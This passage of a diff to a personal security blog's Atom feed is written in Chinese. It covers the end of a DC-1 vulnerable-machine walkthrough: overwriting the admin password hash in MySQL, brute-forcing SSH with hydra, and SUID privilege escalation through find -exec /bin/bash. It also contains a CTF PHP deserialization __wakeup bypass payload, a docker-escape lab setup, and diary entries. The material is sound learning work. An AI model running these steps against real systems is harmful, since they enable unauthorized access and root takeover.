$S$Dyi0o5A9rq9O4imggBtz.INzLGWgqCjo67vC15JYgHjEVtkpdV&#x2F;F<br>覆盖admin的密码<br>mysql&gt;update users set pass&#x3D;”$S$Dyi0o5A9rq9O4imggBtz.INzLGWgqCjo67vC15JYgHjEVtkpdV&#x2F;F” where name&#x3D;”admin”;<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201700729.png" srcset="/img/loading.gif" lazyload><br>成功登录，之后再dashborad中发现falg3<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201700614.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411201701862.png" srcset="/img/loading.gif" lazyload></p></blockquote><h4 id="获取flag4，爆破密码"><a href="#获取flag4，爆破密码" class="headerlink" title="获取flag4，爆破密码"></a>获取flag4，爆破密码</h4><blockquote><p>查看etc&#x2F;passwd,发现falg4的账户，查询falg4的home目录<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201702238.png" srcset="/img/loading.gif" lazyload><br>，这次发现需要root目录，而且让我们爆破了<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201703822.png" srcset="/img/loading.gif" lazyload><br>我们也有可能无法访问&#x2F;home&#x2F;flag4&#x2F;flag4.txt，可以用hydra工具来爆破flag4的密码,发现密码是，orange<br>hydra -l flag4 -P &#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst 192.168.56.146 ssh<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201709083.png" srcset="/img/loading.gif" lazyload></p></blockquote><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><p>查找一个属于root的拥有s权限的文件</p><ul><li>SUID(Set User ID)，SUID 可以让调用者以文件拥有者的身份运行该文件，所以我们利用 SUID 提权的思路就是运行 root 用户所拥有的 SUID 的文件，那么我们运行该文件的时候就得获得 root 用户的身份了。</li></ul><p>常见的可用于 SUID 提权的文件有：</p><blockquote><p>find、bash、nmap、vim、more、less、nano、cp<br>&#x2F;&#x2F;当没有s权限时可以使用：chmod u+s 命令路径，增加权限</p></blockquote><p>查找哪些命令具备 SUID 标识</p><blockquote><p>find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null<br>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p></blockquote><p>发现find文件<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201714007.png" srcset="/img/loading.gif" lazyload><br>使用find文件来提权：<br>利用 find 命令随便查找一个正确的文件（夹）路径，后面加上 -exec shell 命令 ;<br>提权 &#x2F;bin&#x2F;bash 或者 &#x2F;bin&#x2F;sh<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201717565.png" srcset="/img/loading.gif" lazyload><br>最后完成flag获取<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201719543.png" srcset="/img/loading.gif" lazyload></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>DC-1虽然还是比较简单，但是流程也比较长在此做一个总结，DC-1靶机主要考察了信息收集、漏洞利用、权限提升、提权等基本知识。<br>数据库的操作，suid提权，hydra爆破ssh端口，这些都是我之前没有接触过的跟着流程走一边还是挺好的</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;学习web怎么可以少了对靶机的攻击呢，渗透方向的学习必须要有靶机攻击的基础，前几天看到一篇文章发现DC系列正好可以来训练自己的水平和对工具的</summary>
+      
+    
+    
+    
+    <category term="网络" scheme="https://fogpost.top/categories/%E7%BD%91%E7%BB%9C/"/>
+    
+    
+    <category term="web" scheme="https://fogpost.top/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>电子榨菜</title>
+    <link href="https://fogpost.top/2024/11/18/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/"/>
+    <id>https://fogpost.top/2024/11/18/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/</id>
+    <published>2024-11-18T15:46:37.000Z</published>
+    <updated>2024-11-18T15:48:09.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="电子榨菜"><a href="#电子榨菜" class="headerlink" title="电子榨菜"></a>电子榨菜</h1><h2 id="2024-10-26-23-06-28"><a href="#2024-10-26-23-06-28" class="headerlink" title="2024-10-26 23:06:28"></a>2024-10-26 23:06:28</h2><p>写写干了什么，现在好想玩星际啊，不想写东西了，直接开完，这个geekcode还会接我话好玩的，星际推荐玩星际酒馆，不过在写这个东西的时候突然发现，一个功能，就是vscode的自动换行功能直接搜就行好用的，会根据现在的页面大小自动换行，星际战役好贵啊250，早十年玩就好了，还会送的，要不要写写明天干什么呢。，加个评论，看看这些好玩吧<br><img src="https://gitee.com/fogpost/photo/raw/master/202410262318542.png" srcset="/img/loading.gif" lazyload></p><h2 id="2024-10-29"><a href="#2024-10-29" class="headerlink" title="2024-10-29"></a>2024-10-29</h2><p>今天的网鼎杯也是坐上一次大牢了，八个小时满打满算直接看了5个小时的空挡，这个是安卓，也是坐上牢，我发现逆向领域简直就是一个乙游大世界，想要成熟稳重有我们的windows逆向，想要幽默风趣有我们的安卓逆向，想要老公姐有我们的硬件逆向，我们逆向领域真是吃得太好了，妈的刚刚发生了一件大事，狗吧微软把我的贴子吃掉了，php木马的篇帖子直接被删了没办法还原，看样子以后还是尽量用图片把，晚上陪337寝室出去嗨皮了一把，被ylq坑惨了，🐕吧带的什么破地方，吃不得，下次带我的好朋友hy去吃，明天开始看看逆向核心原理吧，沉淀得太少喽。<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292358898.jpg" srcset="/img/loading.gif" lazyload></p><h2 id="2024-11-7"><a href="#2024-11-7" class="headerlink" title="2024-11-7"></a>2024-11-7</h2><p>距离上次记录已经过了这么久了啊，也是过去一个多礼拜了，这个礼拜感觉有点摆烂了，早点离开寝室去搞复习，不然就要挂大科了，绝对不能挂科，不然会难受死去，我也是是给小登出上题了，但是感觉不太好现在就发过程出来，等比赛结束以后再从草稿箱里面拿出来吧，最近又看到一个新的ctf知识网站了，感觉挺不错的但是又有一个通病，逆向方面是真的不行，我在想要不要自己再搭一个reverse-wiki出来，好好强化一下这个领域的实力，不然真的逆向不如和pwn和在一起算了，虽然本来也差不多，但是过程逆向和漏洞利用的区别还是有的</p><h2 id="2024-11-10"><a href="#2024-11-10" class="headerlink" title="2024-11-10"></a>2024-11-10</h2><p>又过了两天了，该开始高区块链的复习了，嗯嗯还有网课注意一下，那些网课要去刷，最近又发现了好用的工具Microsofttodo，虽然少了些功能但是能用就行，ticktick还是有些麻烦，写算法我写写写，每次周末就是摆大烂，感觉这个recerse-wiki要留到寒假去搞了，但是寒假就要开始准备考研了，时间不多喽，看看寒假能不能开个好头<br><img src="https://gitee.com/fogpost/photo/raw/master/202411102003839.png" srcset="/img/loading.gif" lazyload></p><h2 id="2024-11-18"><a href="#2024-11-18" class="headerlink" title="2024-11-18"></a>2024-11-18</h2><p>娘西皮的，又这个点了，看样子要积极出去搞学习，寝室就是摆大烂，狗屎软件工程不会复习，昨天晚上又和室友讨论怎么活下去的问题，人生啊任重而道远，考研，考公，或是直接工作都是一种选择，我是想去考研究生的，也必然是要去做这件事的，但是事实合乎如此么，也确实是合乎如此<br><img src="https://gitee.com/fogpost/photo/raw/master/202411182346697.png" srcset="/img/loading.gif" lazyload></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;电子榨菜&quot;&gt;&lt;a href=&quot;#电子榨菜&quot; class=&quot;headerlink&quot; title=&quot;电子榨菜&quot;&gt;&lt;/a&gt;电子榨菜&lt;/h1&gt;&lt;h2 id=&quot;2024-10-26-23-06-28&quot;&gt;&lt;a href=&quot;#2024-10-26-23-06-28&quot; class</summary>
+      
+    
+    
+    
+    <category term="电子榨菜" scheme="https://fogpost.top/categories/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/"/>
+    
+    
+    <category term="snake" scheme="https://fogpost.top/tags/snake/"/>
+    
+  </entry>
   
   <entry>
     <title>php绕过</title>
@@ -176,54 +309,6 @@
   </entry>
   
   <entry>
-    <title>cve-2020-0492docker逃逸</title>
-    <link href="https://fogpost.top/2024/11/04/cve-2020-0492docker%E9%80%83%E9%80%B8/"/>
-    <id>https://fogpost.top/2024/11/04/cve-2020-0492docker%E9%80%83%E9%80%B8/</id>
-    <published>2024-11-04T12:00:19.000Z</published>
-    <updated>2024-11-04T12:46:52.388Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="cve-2020-0492docker逃逸"><a href="#cve-2020-0492docker逃逸" class="headerlink" title="cve-2020-0492docker逃逸"></a>cve-2020-0492docker逃逸</h1><p>这个玩意主要是挺有意思的在网上也有较多的资料，于是拿过来试一试</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>漏洞编号: CVE-2022-0492<br>漏洞产品: linux kernel - cgroup<br>影响版本: ~linux kernel 5.17-rc3<br>漏洞危害: 当容器没有开启额外安全措施时，获得容器内root 权限即可逃逸到宿主机</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>系统：wsl Ubuntu22.04<br>内核：5.15.153.1-microsoft-standard-WSL2<br>docker20.10.22<a href="https://blog.csdn.net/qq_43469846/article/details/131211383">下载方式</a>  </p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>下载Ubutu22.04的镜像，查看各个部件版本信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202411042046526.png" srcset="/img/loading.gif" lazyload></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#关闭所有安全防护启动docker</span><br>docker run --<span class="hljs-built_in">rm</span> -it -h cve --name cve --security-opt=<span class="hljs-string">&quot;seccomp=unconfined&quot;</span> --security-opt=<span class="hljs-string">&quot;apparmor=unconfined&quot;</span> ubuntu:20.04 /bin/bash <br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;cve-2020-0492docker逃逸&quot;&gt;&lt;a href=&quot;#cve-2020-0492docker逃逸&quot; class=&quot;headerlink&quot; title=&quot;cve-2020-0492docker逃逸&quot;&gt;&lt;/a&gt;cve-2020-0492docker逃逸&lt;/</summary>
-      
-    
-    
-    
-    <category term="渗透测试" scheme="https://fogpost.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-    <category term="CVE" scheme="https://fogpost.top/tags/CVE/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ctf_reverse_mips</title>
-    <link href="https://fogpost.top/2024/11/02/ctf-reverse-mips/"/>
-    <id>https://fogpost.top/2024/11/02/ctf-reverse-mips/</id>
-    <published>2024-11-02T10:00:00.000Z</published>
-    <updated>2024-11-02T10:03:30.638Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="MIPS逆向"><a href="#MIPS逆向" class="headerlink" title="MIPS逆向"></a>MIPS逆向</h1><p>强网杯虽然又是一个也没写出来，但是学到了很多东西，之前没接触过的体型在这里出现了便可以借此机会学习一下</p><h2 id="攻防世界-babymips"><a href="#攻防世界-babymips" class="headerlink" title="[攻防世界 babymips]"></a>[攻防世界 babymips]</h2><ul><li>查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202411021803000.png" srcset="/img/loading.gif" lazyload><br>无事发生</li><li>IDA分析</li></ul>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;MIPS逆向&quot;&gt;&lt;a href=&quot;#MIPS逆向&quot; class=&quot;headerlink&quot; title=&quot;MIPS逆向&quot;&gt;&lt;/a&gt;MIPS逆向&lt;/h1&gt;&lt;p&gt;强网杯虽然又是一个也没写出来，但是学到了很多东西，之前没接触过的体型在这里出现了便可以借此机会学习一下&lt;/p</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://fogpost.top/categories/CTF/"/>
-    
-    
-    <category term="ctf" scheme="https://fogpost.top/tags/ctf/"/>
-    
-  </entry>
-  
-  <entry>
     <title>ctf_vm虚拟机</title>
     <link href="https://fogpost.top/2024/11/02/ctf-vm%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
     <id>https://fogpost.top/2024/11/02/ctf-vm%E8%99%9A%E6%8B%9F%E6%9C%BA/</id>
@@ -290,19 +375,6 @@
     
     
     <category term="ctf" scheme="https://fogpost.top/tags/ctf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>goldeneye_v1</title>
-    <link href="https://fogpost.top/2024/10/31/goldeneye-v1/"/>
-    <id>https://fogpost.top/2024/10/31/goldeneye-v1/</id>
-    <published>2024-10-31T09:00:03.000Z</published>
-    <updated>2024-10-31T09:00:03.610Z</updated>
-    
-    
-    
-    
     
   </entry>
   
@@ -400,83 +472,6 @@
     
     
     <category term="tool" scheme="https://fogpost.top/tags/tool/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>linux换源</title>
-    <link href="https://fogpost.top/2024/10/28/linux/"/>
-    <id>https://fogpost.top/2024/10/28/linux/</id>
-    <published>2024-10-28T04:39:55.000Z</published>
-    <updated>2024-11-15T07:53:03.622Z</updated>
-    
-    <content type="html"><![CDATA[<p>镜像省的搜</p><blockquote><p>sudo cp &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list_backup</p></blockquote><blockquote><p>sudo gedit &#x2F;etc&#x2F;apt&#x2F;sources.list</p></blockquote><blockquote></blockquote><p>#deb <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>#deb-src <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;镜像省的搜&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;sudo cp &amp;#x2F;etc&amp;#x2F;apt&amp;#x2F;sources.list &amp;#x2F;etc&amp;#x2F;apt&amp;#x2F;sources.list_backup&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;blo</summary>
-      
-    
-    
-    
-    <category term="tool" scheme="https://fogpost.top/categories/tool/"/>
-    
-    
-    <category term="linux" scheme="https://fogpost.top/tags/linux/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>反序列化例题</title>
-    <link href="https://fogpost.top/2024/10/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    <id>https://fogpost.top/2024/10/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
-    <published>2024-10-27T13:24:29.000Z</published>
-    <updated>2024-10-28T13:26:13.212Z</updated>
-    
-    <content type="html"><![CDATA[<p>前期我们先以题带学，进行一下熟悉</p><h3 id="例题1-SWPUCTF-2021-新生赛-no-wakeup"><a href="#例题1-SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="例题1 [SWPUCTF 2021 新生赛]no_wakeup"></a>例题1 [SWPUCTF 2021 新生赛]no_wakeup</h3><p>直接看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;wllm&quot;</span>)&#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No wake up&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>经过wp发现，在调用反序列化时，会自动执行_wakeip()导致passwd被sha1加密，并且不可逆，所以我们要考虑_wakeip()的让绕过</p><ul><li>知识点：php特性，当反序列化字符串中，表示对象属性个数的值大于真实属性个数时，会跳过__wakeup()函数的执行。</li></ul><pre><code class="php">$aa = new HaHaHa();$aa-&gt;admin = &quot;admin&quot;;$aa-&gt;passwd = &quot;wllm&quot;;$stus = serialize($aa);print_r($stus);</code></pre><p>O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}<br>序列化之后我们可以改变参数数量,上传即可<br>O:6:”HaHaHa”:3:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;前期我们先以题带学，进行一下熟悉&lt;/p&gt;
-&lt;h3 id=&quot;例题1-SWPUCTF-2021-新生赛-no-wakeup&quot;&gt;&lt;a href=&quot;#例题1-SWPUCTF-2021-新生赛-no-wakeup&quot; class=&quot;headerlink&quot; title=&quot;例题1 [SWP</summary>
-      
-    
-    
-    
-    <category term="网络" scheme="https://fogpost.top/categories/%E7%BD%91%E7%BB%9C/"/>
-    
-    
-    <category term="php" scheme="https://fogpost.top/tags/php/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>电子榨菜</title>
-    <link href="https://fogpost.top/2024/10/26/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/"/>
-    <id>https://fogpost.top/2024/10/26/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/</id>
-    <published>2024-10-26T15:06:28.345Z</published>
-    <updated>2024-11-10T12:03:18.381Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="电子榨菜"><a href="#电子榨菜" class="headerlink" title="电子榨菜"></a>电子榨菜</h1><h2 id="2024-10-26-23-06-28"><a href="#2024-10-26-23-06-28" class="headerlink" title="2024-10-26 23:06:28"></a>2024-10-26 23:06:28</h2><p>写写干了什么，现在好想玩星际啊，不想写东西了，直接开完，这个geekcode还会接我话好玩的，星际推荐玩星际酒馆，不过在写这个东西的时候突然发现，一个功能，就是vscode的自动换行功能直接搜就行好用的，会根据现在的页面大小自动换行，星际战役好贵啊250，早十年玩就好了，还会送的，要不要写写明天干什么呢。，加个评论，看看这些好玩吧<br><img src="https://gitee.com/fogpost/photo/raw/master/202410262318542.png" srcset="/img/loading.gif" lazyload></p><h2 id="2024-10-29"><a href="#2024-10-29" class="headerlink" title="2024-10-29"></a>2024-10-29</h2><p>今天的网鼎杯也是坐上一次大牢了，八个小时满打满算直接看了5个小时的空挡，这个是安卓，也是坐上牢，我发现逆向领域简直就是一个乙游大世界，想要成熟稳重有我们的windows逆向，想要幽默风趣有我们的安卓逆向，想要老公姐有我们的硬件逆向，我们逆向领域真是吃得太好了，妈的刚刚发生了一件大事，狗吧微软把我的贴子吃掉了，php木马的篇帖子直接被删了没办法还原，看样子以后还是尽量用图片把，晚上陪337寝室出去嗨皮了一把，被ylq坑惨了，🐕吧带的什么破地方，吃不得，下次带我的好朋友hy去吃，明天开始看看逆向核心原理吧，沉淀得太少喽。<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292358898.jpg" srcset="/img/loading.gif" lazyload></p><h2 id="2024-11-7"><a href="#2024-11-7" class="headerlink" title="2024-11-7"></a>2024-11-7</h2><p>距离上次记录已经过了这么久了啊，也是过去一个多礼拜了，这个礼拜感觉有点摆烂了，早点离开寝室去搞复习，不然就要挂大科了，绝对不能挂科，不然会难受死去，我也是是给小登出上题了，但是感觉不太好现在就发过程出来，等比赛结束以后再从草稿箱里面拿出来吧，最近又看到一个新的ctf知识网站了，感觉挺不错的但是又有一个通病，逆向方面是真的不行，我在想要不要自己再搭一个reverse-wiki出来，好好强化一下这个领域的实力，不然真的逆向不如和pwn和在一起算了，虽然本来也差不多，但是过程逆向和漏洞利用的区别还是有的</p><h2 id="2024-11-10"><a href="#2024-11-10" class="headerlink" title="2024-11-10"></a>2024-11-10</h2><p>又过了两天了，该开始高区块链的复习了，嗯嗯还有网课注意一下，那些网课要去刷，最近又发现了好用的工具Microsofttodo，虽然少了些功能但是能用就行，ticktick还是有些麻烦，写算法我写写写，每次周末就是摆大烂，感觉这个recerse-wiki要留到寒假去搞了，但是寒假就要开始准备考研了，时间不多喽，看看寒假能不能开个好头<br><img src="https://gitee.com/fogpost/photo/raw/master/202411102003839.png" srcset="/img/loading.gif" lazyload></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;电子榨菜&quot;&gt;&lt;a href=&quot;#电子榨菜&quot; class=&quot;headerlink&quot; title=&quot;电子榨菜&quot;&gt;&lt;/a&gt;电子榨菜&lt;/h1&gt;&lt;h2 id=&quot;2024-10-26-23-06-28&quot;&gt;&lt;a href=&quot;#2024-10-26-23-06-28&quot; class</summary>
-      
-    
-    
-    
-    <category term="电子榨菜" scheme="https://fogpost.top/categories/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/"/>
-    
-    
-    <category term="snake" scheme="https://fogpost.top/tags/snake/"/>
     
   </entry>
   
